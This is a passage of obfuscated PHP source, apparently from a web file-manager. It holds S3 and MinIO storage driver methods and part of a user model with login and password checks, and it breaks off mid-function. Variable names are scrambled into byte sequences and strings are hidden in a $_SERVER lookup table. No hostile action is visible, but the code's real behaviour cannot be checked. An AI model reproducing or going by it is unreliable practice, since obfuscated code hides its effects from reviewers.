$this->client->getAccessControlPolicy($this->bucket, $íè—ÒÉ˚); if (!$®˘Ç˜»⁄) { return !1; } return in_array($®˘Ç˜»⁄, array($œùƒ…õÌ[241], $œùƒ…õÌ[242], $œùƒ…õÌ[243])) ? !0 : !1; } public function canWrite($ç¥Æ∞¸ˆ) { $öÜù†ÃÑ =& $_SERVER[ß⁄ˆÇ†Œ]; $òõ¯ü§’ = $this->client->getAccessControlPolicy($this->bucket, $ç¥Æ∞¸ˆ); if (!$òõ¯ü§’) { return !1; } return in_array($òõ¯ü§’, array($öÜù†ÃÑ[241], $öÜù†ÃÑ[242])) ? !0 : !1; } public function getContent($‘œ§‰ö–) { return $this->client->getObject($this->bucket, $‘œ§‰ö–); } public function setContent($Á∞ÏÆ≠Õ, $è◊ç≥ıÔ = '', $Ü˘ÃËìÁ = false) { $∂„ÌÔ˙∑ =& $_SERVER[ß⁄ˆÇ†Œ]; $Á∞ÏÆ≠Õ = $Ü˘ÃËìÁ ? trim($Á∞ÏÆ≠Õ, $∂„ÌÔ˙∑[8]) . $∂„ÌÔ˙∑[8] : $Á∞ÏÆ≠Õ; $ÿ´”–ôï = get_file_mime(get_path_ext($Á∞ÏÆ≠Õ)); $°›ª¸àò = $this->client->putObject($è◊ç≥ıÔ, $this->bucket, $Á∞ÏÆ≠Õ, $∂„ÌÔ˙∑[229], array(), $ÿ´”–ôï); if (!$°›ª¸àò) { return !1; } if ($Ü˘ÃËìÁ) { return !0; } return $°›ª¸àò ? !0 : !1; } public function fileSubstr($≠ªâÏ‡µ, $ÈÈ‘⁄¡«, $Æ≥ºà≈≠) { $“È·ÙÃ˛ = $ÈÈ‘⁄¡« + $Æ≥ºà≈≠ - 1; return $this->client->getObject($this->bucket, $≠ªâÏ‡µ, array($_SERVER[ß⁄ˆÇ†Œ][244] => "\x62\x79\164\145\163\75{$ÈÈ‘⁄¡«}\x2d{$“È·ÙÃ˛}")); } public function upload($Âÿïô»†, $ùá—Î≤è, $©∏≠Óªñ = false, $¬ À÷Ç = REPEAT_REPLACE) { $ÄøãòÃÇ =& $_SERVER[ß⁄ˆÇ†Œ]; $∏Ôæ∏∆¯ = array($ÄøãòÃÇ[245] => @md5_file($ùá—Î≤è)); $”˝é‡¶ç = array($ÄøãòÃÇ[246] => get_file_mime(get_path_ext($Âÿïô»†))); if (IO::size($ùá—Î≤è) <= 1024 * 1024 * 200) { $æ™¶Ÿ˜® = $this->client->putObjectFile($ùá—Î≤è, $this->bucket, $Âÿïô»†, $ÄøãòÃÇ[229], $∏Ôæ∏∆¯, $”˝é‡¶ç); return !empty($æ™¶Ÿ˜®) ? $this->getPathOuter($Âÿïô»†) : !1; } $•ºÃåΩ√ = $this->client->multiUploadObject($ùá—Î≤è, $this->bucket, trim($Âÿïô»†, $ÄøãòÃÇ[8]), $∏Ôæ∏∆¯, $”˝é‡¶ç); return $•ºÃåΩ√ ? $this->getPathOuter($Âÿïô»†) : !1; } public function download($åﬂ§ñµû, $ÇÛé”˚) { if (!@is_dir($this->pathFather($ÇÛé”˚)) && !IO::mkdir($this->pathFather($ÇÛé”˚))) { return !1; } $Ô§î¡ìπ = $this->client->getObject($this->bucket, $åﬂ§ñµû, array(), $ÇÛé”˚); return $Ô§î¡ìπ !== !1 ? $ÇÛé”˚ : !1; } public function link($»∂ß£ ÷, $à™•çªû = array()) { $⁄ﬁàƒ˘Ì =& $_SERVER[ß⁄ˆÇ†Œ]; if ($this->signVer == $⁄ﬁàƒ˘Ì[247]) { return $this->client->getAuthenticatedURL($this->bucket, $»∂ß£ ÷, 3600 * 12, $à™•çªû); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($»∂ß£ ÷, $⁄ﬁàƒ˘Ì[8]), 3600 * 12, $this->region, array(), !0, $à™•çªû); } public function fileOut($§ªà∫ó•, $‡ç’ŒìÀ = false, $¥ ÀÓ„– = false, $ŒÒ≤•±é = '') { $Àƒ‘≤ªú =& $_SERVER[ß⁄ˆÇ†Œ]; if ($this->isFileOutServer()) { return $this->fileOutServer($§ªà∫ó•, $‡ç’ŒìÀ, $¥ ÀÓ„–, $ŒÒ≤•±é); } if (!$¥ ÀÓ„–) { $¥ ÀÓ„– = $this->pathThis($§ªà∫ó•); } $ÔÖ‚—Åê = get_file_mime(get_path_ext($¥ ÀÓ„–)); if ($ÔÖ‚—Åê == $Àƒ‘≤ªú[248]) { return parent::fileOut($§ªà∫ó•, $‡ç’ŒìÀ, $¥ ÀÓ„–, $ŒÒ≤•±é); } $‘ÁÜ¢¶˛ = array($Àƒ‘≤ªú[249] => $ÔÖ‚—Åê); if ($‡ç’ŒìÀ) { $‘ÁÜ¢¶˛[$Àƒ‘≤ªú[250]] = $Àƒ‘≤ªú[251] . rawurlencode($¥ ÀÓ„–); } else { } $ôÕ˝íˆ‡ = $this->link($§ªà∫ó•, $‘ÁÜ¢¶˛); $this->fileOutLink($ôÕ˝íˆ‡); } public function fileOutServer($öûﬂ⁄Ü¡, $∏ïΩÍúÂ = false, $¡©Ä·Óâ = false, $”úƒ’´” = '') { parent::fileOut($öûﬂ⁄Ü¡, $∏ïΩÍúÂ, $¡©Ä·Óâ, $”úƒ’´”); } public function fileOutImageServer($ãıÅ∆‰∆, $ã‹º®Î¯ = 250) { parent::fileOutImage($ãıÅ∆‰∆, $ã‹º®Î¯); } public function hashMd5($Ω∑≈îÄ∞, $±À±Ç≈ï = '') { $»ŸÆ‘√¨ = $this->objectMeta($Ω∑≈îÄ∞); if (!$»ŸÆ‘√¨) { return !1; } $±À±Ç≈ï = $±À±Ç≈ï ? $±À±Ç≈ï : _get($»ŸÆ‘√¨, $_SERVER[ß⁄ˆÇ†Œ][252]); return $±À±Ç≈ï; } public function uploadFormData($§’Áªù§, $˜ÙÚ»Ë¯ = 3600) { $ÒŒ—¯¶§ =& $_SERVER[ß⁄ˆÇ†Œ]; $ã”â‚”µ = $this->pathFather($§’Áªù§); $¯í¨£∂æ = $this->client->getHttpUploadPostParams($this->bucket, $ã”â‚”µ, $ÒŒ—¯¶§[229], $˜ÙÚ»Ë¯); return array_merge((array) $¯í¨£∂æ, array($ÒŒ—¯¶§[208] => $this->getHost())); } public function multiUploadFormData($¡™¥≤Ñô, $ÀóÔ¨Û° = 3600) { $‰Îºá˜ =& $_SERVER[ß⁄ˆÇ†Œ]; $‘ì∏πù∑ = gmdate($‰Îºá˜[253]); $Ä∞È“◊œ = array(); $‘ë¥˚¡∏ = $this->client->getUploadId($this->bucket, $¡™¥≤Ñô, $Ä∞È“◊œ); if (!$‘ë¥˚¡∏) { return !1; } return array($‰Îºá˜[254] => $‘ë¥˚¡∏, $‰Îºá˜[208] => $this->getHost() . $‰Îºá˜[8] . $this->pathEncode($¡™¥≤Ñô), $‰Îºá˜[255] => $‘ì∏πù∑, $‰Îºá˜[97] => $¡™¥≤Ñô); } public function multiUploadAuthData($‚ã≥ïµ‚, $ãÚ‚ò«∫ = array()) { $≠ñüÊ¬‚ =& $_SERVER[ß⁄ˆÇ†Œ]; $›ŒÀßÏÛ = isset($ãÚ‚ò«∫[$≠ñüÊ¬‚[255]]) ? $ãÚ‚ò«∫[$≠ñüÊ¬‚[255]] : gmdate($≠ñüÊ¬‚[253]); $Ó•ËÒÂÍ = isset($ãÚ‚ò«∫[$≠ñüÊ¬‚[169]]) ? $ãÚ‚ò«∫[$≠ñüÊ¬‚[169]] : $≠ñüÊ¬‚[12]; $§¶‚†¥› = $ãÚ‚ò«∫[$≠ñüÊ¬‚[97]]; unset($ãÚ‚ò«∫[$≠ñüÊ¬‚[97]]); if (isset($ãÚ‚ò«∫[$≠ñüÊ¬‚[256]])) { $ãÚ‚ò«∫[$≠ñüÊ¬‚[255]] = $›ŒÀßÏÛ; return $this->listUploadParts($§¶‚†¥›, $ãÚ‚ò«∫); } $æö¨é°˝ = array($≠ñüÊ¬‚[257], $≠ñüÊ¬‚[12], $≠ñüÊ¬‚[123], $≠ñüÊ¬‚[12], "\170\x2d\x61\x6d\172\55\x64\x61\164\145\x3a{$›ŒÀßÏÛ}", $≠ñüÊ¬‚[8] . $this->bucket . $≠ñüÊ¬‚[8] . $this->pathEncode($§¶‚†¥›) . $Ó•ËÒÂÍ); if (strpos($Ó•ËÒÂÍ, $≠ñüÊ¬‚[258]) === 0) { $æö¨é°˝[0] = $≠ñüÊ¬‚[259]; } if (isset($ãÚ‚ò«∫[$≠ñüÊ¬‚[260]]) && $ãÚ‚ò«∫[$≠ñüÊ¬‚[260]] == $≠ñüÊ¬‚[261]) { $æö¨é°˝[0] = $≠ñüÊ¬‚[261]; } $ùßŒÈ˙° = implode($≠ñüÊ¬‚[262], $æö¨é°˝); $Âé⁄¿Îå = base64_encode(hash_hmac($≠ñüÊ¬‚[263], $ùßŒÈ˙°, $this->secret, !0)); $”›Ï’Œî = $≠ñüÊ¬‚[264] . $this->accessKey . $≠ñüÊ¬‚[4] . $Âé⁄¿Îå; if (strpos($Ó•ËÒÂÍ, $≠ñüÊ¬‚[258]) === 0) { return array($≠ñüÊ¬‚[265] => $”›Ï’Œî, $≠ñüÊ¬‚[255] => $›ŒÀßÏÛ); } return $”›Ï’Œî; } public function listUploadParts($˘¶Â¥Ûé, $®ûäêè– = array()) { $◊˝ºû∂è =& $_SERVER[ß⁄ˆÇ†Œ]; $≠õÓæÀ„ = str_replace($◊˝ºû∂è[266], $◊˝ºû∂è[12], $®ûäêè–[$◊˝ºû∂è[169]]); $ëÕ˜∫Øö = $this->client->listParts($this->bucket, $˘¶Â¥Ûé, $≠õÓæÀ„); if (!$ëÕ˜∫Øö) { return !1; } unset($®ûäêè–[$◊˝ºû∂è[256]], $®ûäêè–[$◊˝ºû∂è[260]]); $®ûäêè–[$◊˝ºû∂è[97]] = $˘¶Â¥Ûé; $ÁÒ’Ã´¸ = $this->multiUploadAuthData($˘¶Â¥Ûé, $®ûäêè–); if (empty($ÁÒ’Ã´¸)) { return !1; } return array($◊˝ºû∂è[265] => $ÁÒ’Ã´¸, $◊˝ºû∂è[255] => $®ûäêè–[$◊˝ºû∂è[255]], $◊˝ºû∂è[267] => $ëÕ˜∫Øö); } public function getHost() { $ù‚‘Á‹’ =& $_SERVER[ß⁄ˆÇ†Œ]; $‰êÅò∑∆ = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($ù‚‘Á‹’[70], $ù‚‘Á‹’[64], $ù‚‘Á‹’[69], $ù‚‘Á‹’[62]))) { return $‰êÅò∑∆ . $ù‚‘Á‹’[8] . $this->bucket; } $‰êÅò∑∆ = explode($ù‚‘Á‹’[210], $‰êÅò∑∆); return $‰êÅò∑∆[0] . $ù‚‘Á‹’[210] . $this->bucket . $ù‚‘Á‹’[10] . $‰êÅò∑∆[1]; } public function size($∫ıùØ¯™) { $πúÔø›Ö = $this->objectMeta($∫ıùØ¯™); return $πúÔø›Ö ? $πúÔø›Ö[$_SERVER[ß⁄ˆÇ†Œ][79]] : 0; } public function info($®®…ï å) { if ($this->isFolder($®®…ï å)) { return $this->folderInfo($®®…ï å); } else { if ($this->isFile($®®…ï å)) { return $this->fileInfo($®®…ï å); } } return !1; } public function exist($µ¬—ﬁá±) { return $this->isFile($µ¬—ﬁá±) || $this->isFolder($µ¬—ﬁá±); } public function isFile($æ»”ñµ’) { return !$this->isFolder($æ»”ñµ’) && $this->objectMeta($æ»”ñµ’); } public function isFolder($…»“√Ñ˘) { return $this->cacheMethod($_SERVER[ß⁄ˆÇ†Œ][179], $…»“√Ñ˘); } protected function objectMeta($ﬁ∂öª…«) { return $this->cacheMethod($_SERVER[ß⁄ˆÇ†Œ][181], $ﬁ∂öª…«); } protected function _objectMeta($õ∑ºÏ∏ö) { $Óê†‘¡≥ =& $_SERVER[ß⁄ˆÇ†Œ]; $õ∑ºÏ∏ö = rtrim($õ∑ºÏ∏ö, $Óê†‘¡≥[8]); try { $§¸§ëÔâ = $this->client->getObjectInfo($this->bucket, $õ∑ºÏ∏ö); if (!isset($§¸§ëÔâ[$Óê†‘¡≥[252]]) && isset($§¸§ëÔâ[$Óê†‘¡≥[268]])) { $§¸§ëÔâ[$Óê†‘¡≥[252]] = $§¸§ëÔâ[$Óê†‘¡≥[268]]; } } catch (Exception $•ùìÅŸˆ) { $§¸§ëÔâ = !1; } if (!$§¸§ëÔâ) { } return $§¸§ëÔâ; } protected function _isFolder($˚‡–Ø∂) { $¸ßÔÉﬂ∫ =& $_SERVER[ß⁄ˆÇ†Œ]; $˚‡–Ø∂ = rtrim($˚‡–Ø∂, $¸ßÔÉﬂ∫[8]); if ($˚‡–Ø∂ == $¸ßÔÉﬂ∫[12] || $˚‡–Ø∂ == $¸ßÔÉﬂ∫[8]) { return !0; } $ó¬ÑïÍ˚ = $this->client->getBucket($this->bucket, $˚‡–Ø∂, null, 1); if (empty($ó¬ÑïÍ˚[$¸ßÔÉﬂ∫[236]])) { return !1; } $ÒÀìâì˙ = $ó¬ÑïÍ˚[$¸ßÔÉﬂ∫[236]][0][$¸ßÔÉﬂ∫[32]]; return stripos($ÒÀìâì˙, $˚‡–Ø∂ . $¸ßÔÉﬂ∫[8]) === 0 ? !0 : !1; if (substr($ÒÀìâì˙, -1) == $¸ßÔÉﬂ∫[8]) { return !0; } if (get_path_this($ÒÀìâì˙) == get_path_this($˚‡–Ø∂)) { return !1; } return !0; } public function listObject($ë«≈∂ç) { return $this->fileList($ë«≈∂ç, $_SERVER[ß⁄ˆÇ†Œ][12], !0); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($‰∫êÓ÷π) { $Ÿ∂Óûæ≥ =& $_SERVER[ß⁄ˆÇ†Œ]; parent::__construct($‰∫êÓ÷π); $this->setSignVersion($Ÿ∂Óûæ≥[247]); if (!$this->region) { $this->region = $Ÿ∂Óûæ≥[269]; $this->client->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function checkRegion() { $æå∑óﬂ˘ = $this->getBucketRgn(); return $this->region == $æå∑óﬂ˘ ? !0 : !1; } public function uploadFormData($ßœªØ‡˜, $Òà†ÕµÙ = 3600) { $ïàÔ˙÷Ö =& $_SERVER[ß⁄ˆÇ†Œ]; $É≥¶øò§ = $ïàÔ˙÷Ö[229]; $¶É≤öπÕ = $ïàÔ˙÷Ö[270]; $†éû¸⁄µ = $ïàÔ˙÷Ö[62]; $ÕúõÉ—ã = gmdate($ïàÔ˙÷Ö[271]); $Æø¸óÕè = gmdate($ïàÔ˙÷Ö[272]); $Œ¶ª¨∂∂ = $ïàÔ˙÷Ö[273]; $ñ°ïÃ≤∏ = $Òà†ÕµÙ . $ïàÔ˙÷Ö[12]; $õêÔîÆ‰ = $ïàÔ˙÷Ö[274]; $âÍÆ⁄˜≤ = array($this->accessKey, $Æø¸óÕè, $this->region, $†éû¸⁄µ, $Œ¶ª¨∂∂); $øôãﬂ™» = implode($ïàÔ˙÷Ö[8], $âÍÆ⁄˜≤); $Ò•¿¯—Ò = array($ïàÔ˙÷Ö[275] => gmdate($ïàÔ˙÷Ö[276], strtotime($ïàÔ˙÷Ö[277])), $ïàÔ˙÷Ö[278] => array(array($ïàÔ˙÷Ö[279] => $this->bucket), array($ïàÔ˙÷Ö[280] => $É≥¶øò§), array($ïàÔ˙÷Ö[281], $ïàÔ˙÷Ö[282], $ïàÔ˙÷Ö[12]), array($ïàÔ˙÷Ö[281], $ïàÔ˙÷Ö[283], $ïàÔ˙÷Ö[12]), array($ïàÔ˙÷Ö[281], $ïàÔ˙÷Ö[284], $ïàÔ˙÷Ö[12]), array($ïàÔ˙÷Ö[285] => $õêÔîÆ‰), array($ïàÔ˙÷Ö[286] => $øôãﬂ™»), array($ïàÔ˙÷Ö[287] => $¶É≤öπÕ), array($ïàÔ˙÷Ö[288] => $ÕúõÉ—ã), array($ïàÔ˙÷Ö[289] => $ñ°ïÃ≤∏))); $îŸ¯à’Ω = base64_encode(json_encode($Ò•¿¯—Ò)); $ŸâÜé”ä = hash_hmac($ïàÔ˙÷Ö[290], $Æø¸óÕè, $ïàÔ˙÷Ö[291] . $this->secret, !0); $≥í…ÇÌ∆ = hash_hmac($ïàÔ˙÷Ö[290], $this->region, $ŸâÜé”ä, !0); $Ç∂ÒÅŸ¿ = hash_hmac($ïàÔ˙÷Ö[290], $†éû¸⁄µ, $≥í…ÇÌ∆, !0); $›ßÌÏ¿Ô = hash_hmac($ïàÔ˙÷Ö[290], $Œ¶ª¨∂∂, $Ç∂ÒÅŸ¿, !0); $Ìõò•é = hash_hmac($ïàÔ˙÷Ö[290], $îŸ¯à’Ω, $›ßÌÏ¿Ô); $ñ©˘ﬂúÄ = array($ïàÔ˙÷Ö[246] => $ïàÔ˙÷Ö[12], $ïàÔ˙÷Ö[292] => $ïàÔ˙÷Ö[12], $ïàÔ˙÷Ö[280] => $É≥¶øò§, $ïàÔ˙÷Ö[285] => $õêÔîÆ‰, $ïàÔ˙÷Ö[293] => $îŸ¯à’Ω, $ïàÔ˙÷Ö[294] => $øôãﬂ™», $ïàÔ˙÷Ö[295] => $¶É≤öπÕ, $ïàÔ˙÷Ö[296] => $ÕúõÉ—ã, $ïàÔ˙÷Ö[297] => $ñ°ïÃ≤∏, $ïàÔ˙÷Ö[298] => $Ìõò•é, $ïàÔ˙÷Ö[208] => $this->getHost()); return $ñ©˘ﬂúÄ; } } goto aåÛ‚Ω‹•†; EõØ°’òµ–: class UserJobModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\155\56\152\157\x62\114\151\163\x74"; public $field = array("\156\x61\x6d\x65", "\144\145\x73\143", "\x73\157\162\x74"); const JOB_KEY = "\163\145\x6c\146\112\x6f\142\x4c\151\x73\x74"; public function listData($ûº¯ã‘ = false, $ç««ËﬂÂ = "\x73\x6f\x72\x74", $°›ô√•≥ = false) { return parent::listData($ûº¯ã‘, $ç««ËﬂÂ, $°›ô√•≥); } public function remove($≈¯–ﬂªë) { return parent::remove($≈¯–ﬂªë); } public function add($∫Î√©È·) { $è≥§Ñﬁµ =& $_SERVER[ß⁄ˆÇ†Œ]; if ($this->findByName($∫Î√©È·[$è≥§Ñﬁµ[32]])) { return !1; } $∫Î√©È·[$è≥§Ñﬁµ[1987]] = $this->getSort(); return parent::insert($∫Î√©È·); } private function getSort() { $ªî˘Îà =& $_SERVER[ß⁄ˆÇ†Œ]; $Åã«öÀÏ = parent::listData(); $ıº˛°”Ÿ = array_to_keyvalue($Åã«öÀÏ, $ªî˘Îà[12], $ªî˘Îà[1987]); return empty($ıº˛°”Ÿ) ? 0 : max($ıº˛°”Ÿ) + 1; } public function update($ØßÒﬂ˘Ã, $∑Ò∆å–ß) { $ÈÚ¨ªÕÍ =& $_SERVER[ß⁄ˆÇ†Œ]; $øπÇ‘ﬂ = parent::listData($ØßÒﬂ˘Ã); $Ä”ΩÆÎ∞ = $this->findByName($∑Ò∆å–ß[$ÈÚ¨ªÕÍ[32]]); if (!$øπÇ‘ﬂ || $Ä”ΩÆÎ∞ && $Ä”ΩÆÎ∞[$ÈÚ¨ªÕÍ[483]] != $øπÇ‘ﬂ[$ÈÚ¨ªÕÍ[483]]) { return !1; } return parent::update($ØßÒﬂ˘Ã, $∑Ò∆å–ß); } public function setUserJob($æ¿Á˚’Ú, $ªìû›‹¸) { $Õòìπó” =& $_SERVER[ß⁄ˆÇ†Œ]; if (!is_array($ªìû›‹¸)) { $ªìû›‹¸ = array($ªìû›‹¸); } $Òß™»„› = parent::listData(); $ñﬁøÒüƒ = array_to_keyvalue($Òß™»„›, $Õòìπó”[32]); $∫Ê™ÙÿÜ = $Õòìπó”[329]; foreach ($ªìû›‹¸ as $¡ıñ≠‘) { if ($ñﬁøÒüƒ[$¡ıñ≠‘]) { $∫Ê™ÙÿÜ .= $ñﬁøÒüƒ[$¡ıñ≠‘][$Õòìπó”[483]] . $Õòìπó”[50]; } else { $î“ËÊì› = $this->add($¡ıñ≠‘); $∫Ê™ÙÿÜ .= $î“ËÊì› . $Õòìπó”[50]; } } $∫Ê™ÙÿÜ = rtrim($∫Ê™ÙÿÜ, $Õòìπó”[50]); Model($Õòìπó”[606])->metaSet($æ¿Á˚’Ú, self::JOB_KEY, $∫Ê™ÙÿÜ); } public function getUserJob($ßà‡“≈Ÿ) { $ø≠Ãﬂ™Î = Model($_SERVER[ß⁄ˆÇ†Œ][606])->metaGet($ßà‡“≈Ÿ); return $this->getUserJobInfo($ø≠Ãﬂ™Î[self::JOB_KEY]); } public function getUserJobInfo($Ü∂›‹Ë¡) { $Å€˝êå‚ =& $_SERVER[ß⁄ˆÇ†Œ]; $áÆºøÙâ = explode($Å€˝êå‚[50], $Ü∂›‹Ë¡); $›åﬂÃ‡ı = parent::listData(); $›åﬂÃ‡ı = array_remove_key($›åﬂÃ‡ı, $Å€˝êå‚[231]); $´Ãé§´» = array(); foreach ($áÆºøÙâ as $√ù™ªä´) { if (isset($›åﬂÃ‡ı[$√ù™ªä´])) { $´Ãé§´»[] = $›åﬂÃ‡ı[$√ù™ªä´]; } } return $´Ãé§´»; } } class UserModel extends ModelBase { protected $tableName = "\x75\163\145\x72"; protected $tableMeta = array("\x74\x61\x62\154\x65\116\x61\155\145" => "\165\163\x65\x72\137\x6d\x65\x74\141", "\155\x65\x74\x61\106\151\x65\x6c\x64" => "\165\x73\x65\x72\111\x44"); protected $simpleField = "\165\163\x65\x72\111\x44\x2c\156\151\143\x6b\x4e\141\x6d\145\x2c\x6e\141\x6d\x65\x2c\141\x76\x61\164\141\x72\54\x73\x65\x78\54\x73\164\x61\164\x75\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($ˆ“ÿÂÉÜ) { $≥”´˚°’ =& $_SERVER[ß⁄ˆÇ†Œ]; $àŸ√ß…Ù = $≥”´˚°’[2443]; return array($≥”´˚°’[2045] => array($ˆ“ÿÂÉÜ[0], $àŸ√ß…Ù), $≥”´˚°’[2047] => array($ˆ“ÿÂÉÜ[0], $àŸ√ß…Ù), $≥”´˚°’[2444] => array($ˆ“ÿÂÉÜ[0], $àŸ√ß…Ù)); } protected function getInfo($Öãî¡®ä, $‘ç≥Á’Ê = false) { $âé˜èÆ´ = $this->getInfoSimple($Öãî¡®ä); if (!is_array($âé˜èÆ´)) { return array(); } if ($‘ç≥Á’Ê) { return $this->_getInfoApply($âé˜èÆ´); } return $this->cacheFunctionGet($_SERVER[ß⁄ˆÇ†Œ][2049], $Öãî¡®ä); } protected function getInfoFull($⁄Ÿø’üŒ, $˜“≈ÍÃÍ = false) { $àÇóÄπò = $this->getInfoSimple($⁄Ÿø’üŒ); if (!is_array($àÇóÄπò)) { return array(); } if ($˜“≈ÍÃÍ) { return $this->_getInfoApply($àÇóÄπò, !0); } return $this->cacheFunctionGet($_SERVER[ß⁄ˆÇ†Œ][2445], $⁄Ÿø’üŒ); } private function _getInfoApply($ıÚﬁü∑Ò, $¶∫ﬁôÀï = false) { $íôÎ»‘∞ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$ıÚﬁü∑Ò) { return $ıÚﬁü∑Ò; } $™£ÿ¥¶õ = md5($íôÎ»‘∞[2446] . $ıÚﬁü∑Ò[$íôÎ»‘∞[963]] . $íôÎ»‘∞[2447] . $ıÚﬁü∑Ò[$íôÎ»‘∞[32]]); $ıÚﬁü∑Ò = $this->_listDataApplyItem($ıÚﬁü∑Ò); $Äˆ≠¯Ô¢ = Model($íôÎ»‘∞[1414])->metaGet($ıÚﬁü∑Ò[$íôÎ»‘∞[90]][$íôÎ»‘∞[193]]); $ıÚﬁü∑Ò[$íôÎ»‘∞[2448]] = $™£ÿ¥¶õ; $ıÚﬁü∑Ò[$íôÎ»‘∞[90]][$íôÎ»‘∞[2243]] = isset($Äˆ≠¯Ô¢[$íôÎ»‘∞[2244]]) ? $Äˆ≠¯Ô¢[$íôÎ»‘∞[2244]] : null; if ($¶∫ﬁôÀï) { $ıÚﬁü∑Ò[$íôÎ»‘∞[547]] = $this->metaGet($ıÚﬁü∑Ò[$íôÎ»‘∞[1764]]); } return $ıÚﬁü∑Ò; } protected function getInfoSimple($∏–Ú⁄®˚, $µ°ˆº®È = false) { $ûÍ¢’‚® =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$∏–Ú⁄®˚) { return array(); } if ($µ°ˆº®È) { $⁄ÔÌÒä€ = $this->where(array($ûÍ¢’‚®[1764] => intval($∏–Ú⁄®˚)))->find(); if (!is_array($⁄ÔÌÒä€)) { return array(); } $⁄ÔÌÒä€[$ûÍ¢’‚®[2449]] = Action($ûÍ¢’‚®[2450])->parseUrl($⁄ÔÌÒä€[$ûÍ¢’‚®[2449]]); return $⁄ÔÌÒä€; } return $this->cacheFunctionGet($ûÍ¢’‚®[2050], $∏–Ú⁄®˚); } protected function getInfoSimpleOuter($∑ò√»î˚) { $‰Ú∫áÿ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$∑ò√»î˚ || $∑ò√»î˚ == 0) { return array($‰Ú∫áÿ[1764] => $‰Ú∫áÿ[228], $‰Ú∫áÿ[32] => $‰Ú∫áÿ[176] . LNG($‰Ú∫áÿ[2451]) . $‰Ú∫áÿ[178], $‰Ú∫áÿ[2449] => STATIC_PATH . $‰Ú∫áÿ[2452]); } $¡¢â–Ôâ = $this->cacheFunctionGet($‰Ú∫áÿ[2050], $∑ò√»î˚); $ˆ˘Á–ã∏ = array_field_key($¡¢â–Ôâ, explode($‰Ú∫áÿ[50], $this->simpleField)); if (!$ˆ˘Á–ã∏) { return array($‰Ú∫áÿ[1764] => $‰Ú∫áÿ[1269], $‰Ú∫áÿ[32] => $‰Ú∫áÿ[176] . LNG($‰Ú∫áÿ[2453]) . $‰Ú∫áÿ[178], $‰Ú∫áÿ[2449] => STATIC_PATH . $‰Ú∫áÿ[2454]); } $ˆ˘Á–ã∏[$‰Ú∫áÿ[2449]] = Action($‰Ú∫áÿ[2450])->parseUrl($ˆ˘Á–ã∏[$‰Ú∫áÿ[2449]]); return $ˆ˘Á–ã∏; } protected function groupUser($ØìÛƒÛ•) { } public static function errorLang($üß¶…˜”) { $◊⁄ê¨Êû =& $_SERVER[ß⁄ˆÇ†Œ]; $≥òË∫ûã = array(self::ERROR_USER_NOT_EXISTS => $◊⁄ê¨Êû[2455], self::ERROR_USER_PASSWORD_ERROR => $◊⁄ê¨Êû[2456], self::ERROR_USER_EXIST_NAME => $◊⁄ê¨Êû[2457], self::ERROR_USER_EXIST_PHONE => $◊⁄ê¨Êû[2458], self::ERROR_USER_EXIST_EMAIL => $◊⁄ê¨Êû[2459], self::ERROR_USER_LOGIN_LOCK => $◊⁄ê¨Êû[2460], self::ERROR_IP_NOT_ALLOW => $◊⁄ê¨Êû[2461], self::ERROR_USER_EXIST_NICKNAME => $◊⁄ê¨Êû[2462]); $ÇØîéÙÌ = LNG($≥òË∫ûã[$üß¶…˜”]); if ($üß¶…˜” == self::ERROR_USER_LOGIN_LOCK) { $«–˙˛≥± = (int) Model($◊⁄ê¨Êû[2463])->get($◊⁄ê¨Êû[2464]); if ($«–˙˛≥± > 60) { $ÇØîéÙÌ = str_replace($◊⁄ê¨Êû[91], ceil($«–˙˛≥± / 60), $ÇØîéÙÌ); } } return $ÇØîéÙÌ; } public function getInfoByMeta($‹⁄ﬁÊ õ, $ÿ˜∂á≤√) { $»ÕÛ¢îì =& $_SERVER[ß⁄ˆÇ†Œ]; $“∫´ª´ñ = Model($»ÕÛ¢îì[2465])->where(array($»ÕÛ¢îì[97] => $‹⁄ﬁÊ õ, $»ÕÛ¢îì[459] => $ÿ˜∂á≤√))->find(); if ($“∫´ª´ñ) { return $this->getInfo($“∫´ª´ñ[$»ÕÛ¢îì[1764]]); } return !1; } public function userLoginCheck($©ÙÏ˝áá, $®¥öà¢˜) { $÷◊ﬂ•ºÅ =& $_SERVER[ß⁄ˆÇ†Œ]; $ªﬁ≠∆ƒ = $this->userLoginFind($©ÙÏ˝áá); if (!$ªﬁ≠∆ƒ) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($ªﬁ≠∆ƒ[$÷◊ﬂ•ºÅ[1764]], $®¥öà¢˜)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($ªﬁ≠∆ƒ[$÷◊ﬂ•ºÅ[1764]]); } public function userLoginFind($‹ØﬂºÌï) { $ÔííÆê‡ =& $_SERVER[ß⁄ˆÇ†Œ]; $ééèØúƒ = array($ÔííÆê‡[32] => $‹ØﬂºÌï, $ÔííÆê‡[2251] => $‹ØﬂºÌï, $ÔííÆê‡[390] => $‹ØﬂºÌï, $ÔííÆê‡[2466] => $‹ØﬂºÌï, $ÔííÆê‡[1074] => $ÔííÆê‡[1076]); if ($this->nickNameRpt()) { unset($ééèØúƒ[$ÔííÆê‡[2251]]); } return $this->where($ééèØúƒ)->find(); } public function clearCache($˛™∑∫éö) { $Â¥ﬁ‹ﬂí =& $_SERVER[ß⁄ˆÇ†Œ]; $this->cacheFunctionClear($Â¥ﬁ‹ﬂí[2049], $˛™∑∫éö); $this->cacheFunctionClear($Â¥ﬁ‹ﬂí[2050], $˛™∑∫éö); $this->cacheFunctionClear($Â¥ﬁ‹ﬂí[2445], $˛™∑∫éö); } public function userPasswordCheck($…æéÊŸ¨, $…≤¨˝à¿) { $£ôÛ’Œ˘ =& $_SERVER[ß⁄ˆÇ†Œ]; 